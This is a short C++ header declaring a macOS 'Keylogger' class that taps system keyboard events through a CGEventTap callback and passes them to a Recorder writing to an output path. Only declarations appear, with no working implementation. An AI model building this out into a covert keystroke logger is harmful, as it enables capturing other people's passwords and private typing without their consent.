#pragma once

#include <ApplicationServices/ApplicationServices.h>

#include "recorder.hpp"

class Keylogger {
 public:
   Keylogger(const std::string& out_path);

  void Run();
  void Stop();

 private:
  static CGEventRef tap_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* user_info);

  Recorder recorder_;

  CFMachPortRef port_;
  CFRunLoopSourceRef source_;
};
